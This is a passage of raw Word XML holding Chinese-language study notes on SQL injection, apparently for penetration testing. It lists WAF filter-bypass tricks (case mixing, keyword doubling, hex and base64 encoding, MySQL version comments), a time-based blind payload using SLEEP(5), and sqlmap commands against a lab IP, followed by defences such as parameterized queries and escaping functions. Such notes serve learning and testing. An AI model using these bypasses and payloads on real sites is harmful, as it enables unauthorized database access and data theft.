          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>form-data</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的方式提交。当我们在测试站点的时候，如果发现</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>提交的数据被过滤掉了，此时可以考虑使用</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>form-data</w:t>
      </w:r>
      <w:r w:rsidRPr="004C14EA">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的方式去提交。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA3B72">
      <w:pPr>
        <w:ind w:left="420"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>攻击：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
        <w:t>1.select/seLeCt/selselectect;2==3-1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>2.(MySQL)Load_File(url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>文字过滤</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>转</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Hex(16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>进制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3.base64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>关键字编码、解码；二次编码需要考虑</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>base64,url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码。可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%23</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>来测试是否进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>4.sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”等过滤，用“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”等来替代</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盲注：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>Payload: title=xiaoshiniudao&amp;order=id AND (SELECT * FROM (SELECT(SLEEP(5)))PisS)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>6.select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>关键字设置大小写过滤时可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql50000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字符，如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>/*!50000select*/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A"/>
    <w:p w:rsidR="00E72DBD" w:rsidRDefault="00912F6A" w:rsidP="00E72DBD">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00434549">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:r w:rsidRPr="00434549">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E72DBD" w:rsidRPr="00E72DBD" w:rsidRDefault="00E72DBD" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>基本</w:t>
      </w:r>
      <w:r>
        <w:t>使用实例</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00E72DBD">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>D:\security\sql injection\sqlmapproject-sqlmap-04c1d43&gt;sqlmap -u "http://172.17.50.231/stage/3df71a90c48ca5f4__3/17/action.php" --data act="sd" --dbms mysql</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="002F1717" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="002F1717">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>伪静态网页注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="002F1717" w:rsidP="002F1717">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>qlmap</w:t>
      </w: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中</w:t>
      </w:r>
      <w:r>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>指定</w:t>
      </w:r>
      <w:r>
        <w:t>注入位置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:t>如静态网页为：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F1717" w:rsidRDefault="00C75434" w:rsidP="002F1717">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:hyperlink r:id="rId57" w:history="1">
        <w:r w:rsidR="002F1717" w:rsidRPr="00C874A1">
          <w:rPr>
            <w:rStyle w:val="a4"/>
          </w:rPr>
          <w:t>http://www.xx.com/news/1/23/index.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="002F1717">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="002F1717">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>可利用</w:t>
      </w:r>
      <w:r w:rsidRPr="002F1717">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:r w:rsidRPr="002F1717">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>进行注入，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F1717">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>-u</w:t>
      </w:r>
      <w:r w:rsidRPr="002F1717">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>参数中加上星号即可，例如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F1717" w:rsidRPr="002F1717" w:rsidRDefault="002F1717">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="002F1717">
        <w:t>http://www.xx.com/news/1/23*/index.html</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A0E9B" w:rsidRPr="00DF0994" w:rsidRDefault="002A0E9B" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00DF0994">
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00DF0994">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ql</w:t>
      </w:r>
      <w:r w:rsidRPr="00DF0994">
        <w:t>注入防护办法：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B52A1C" w:rsidRDefault="00B52A1C" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>参数化字符串</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A0E9B" w:rsidRDefault="002A0E9B" w:rsidP="00B52A1C">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t>参数化字符串变量生成字符串语句。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B52A1C" w:rsidRDefault="00B52A1C" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>安全</w:t>
      </w:r>
      <w:r>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B70E80" w:rsidRDefault="00B70E80" w:rsidP="00B52A1C">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t>安全的变量</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:r>
        <w:t>方法。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B70E80" w:rsidRDefault="00B70E80" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B70E80" w:rsidRDefault="00B70E80" w:rsidP="006B12EC">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:t>val()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r>
        <w:t>，该方法会</w:t>
      </w:r>
      <w:r w:rsidR="00EC226F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>返回</w:t>
      </w:r>
      <w:r>
        <w:t>第一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>有效</w:t>
      </w:r>
      <w:r>
        <w:t>的数值数字，后面的无效部分都省略。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B70E80" w:rsidRDefault="00B70E80" w:rsidP="006B12EC">
      <w:pPr>
        <w:ind w:left="1260" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ntval(</w:t>
      </w:r>
      <w:r>
        <w:t>‘</w:t>
      </w:r>
      <w:r w:rsidRPr="00B70E80">
        <w:t>3/**/or 1=1#</w:t>
      </w:r>
      <w:r>
        <w:t>’)=3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B12EC" w:rsidRDefault="006B12EC" w:rsidP="006B12EC">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ddslash(</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>stripslash()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:t>’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、</w:t>
      </w:r>
      <w:r>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>等</w:t>
      </w:r>
      <w:r>
        <w:t>进行转义。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006B12EC" w:rsidRPr="006B12EC" w:rsidRDefault="006B12EC" w:rsidP="006B12EC">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ysql_</w:t>
      </w:r>
      <w:r>
        <w:t>real_escape_string()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>\x00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>\n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>\r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t>’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、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>\x</w:t>
      </w:r>
      <w:r>
        <w:t>1a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>进行</w:t>
      </w:r>
      <w:r>
        <w:t>转义。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A0E9B" w:rsidRDefault="002A0E9B" w:rsidP="002A0E9B"/>
    <w:p w:rsidR="002A0E9B" w:rsidRDefault="002A0E9B" w:rsidP="002A0E9B"/>
    <w:p w:rsidR="00E17B71" w:rsidRDefault="00E17B71" w:rsidP="00DE7D93">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E17B71" w:rsidRPr="00565D19" w:rsidRDefault="00E17B71" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00565D19">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00565D19">
        <w:t>没有错误重定向时：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E17B71" w:rsidRDefault="00E17B71" w:rsidP="00E17B71">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>打</w:t>
      </w:r>
      <w:r>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>报错</w:t>
      </w:r>
      <w:r>
        <w:t>，或者</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">bool </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盲注</w:t>
      </w:r>
      <w:r>
        <w:t>就能说明存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E17B71" w:rsidRPr="00565D19" w:rsidRDefault="00E17B71" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00565D19">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如果</w:t>
      </w:r>
      <w:r w:rsidRPr="00565D19">
        <w:t>存在错误重定向时：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E17B71" w:rsidRPr="00E17B71" w:rsidRDefault="00E17B71" w:rsidP="003009F5">
      <w:pPr>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>应当</w:t>
      </w:r>
      <w:r>
        <w:t>先通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>正确</w:t>
      </w:r>
      <w:r>
        <w:t>显示结果确认后台过滤规则，然后再利用类似</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>bool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盲注</w:t>
      </w:r>
      <w:r>
        <w:t>的正反对比规则确定是否存在注入。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E17B71" w:rsidRDefault="00E17B71" w:rsidP="00DE7D93">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="001735F5" w:rsidRPr="003009F5" w:rsidRDefault="001735F5" w:rsidP="001735F5"/>
    <w:sectPr w:rsidR="001735F5" w:rsidRPr="003009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5434" w:rsidRDefault="00C75434" w:rsidP="0045694B">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00C75434" w:rsidRDefault="00C75434" w:rsidP="00456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5434" w:rsidRDefault="00C75434" w:rsidP="0045694B">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00C75434" w:rsidRDefault="00C75434" w:rsidP="004569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927E7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F0DEFCC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6370AC1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9774CE1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055F5D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76064E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D9761A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="43A6A4FA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123B0D6C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1C22CDD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235E2E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F10AC92C"/>
    <w:lvl w:ilvl="0" w:tplc="925E92C6">
      <w:start w:val="1"/>
      <w:numFmt w:val="upperLetter"/>
      <w:pStyle w:val="3"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1259" w:hanging="420"/>
      </w:p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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="173207A5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0340143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1934257C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CD888100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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="22C76339"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AB186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7A6519F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EDE0450E"/>
    <w:lvl w:ilvl="0" w:tplc="8E90AA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CAC7825"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="60F058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834" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="0409001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1254" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0409000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1674" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="04090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2094" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="0409001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2514" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="0409000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2934" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="04090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3354" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0409001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="3774" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="34427BD0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="731EBE6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DB5595"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F20E9C24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3874685D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E7C2855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F2D5BDA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6DDE71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37D624A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="827EACDC"/>
    <w:lvl w:ilvl="0" w:tplc="F216EFF4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="2"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="840" w:hanging="420"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="CEF04322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A765A37"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="662617A4"/>
    <w:lvl w:ilvl="0" w:tplc="0409001B">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1686" w:hanging="420"/>
      </w:p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17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4C6634AE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="62BC4C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D847848"/>
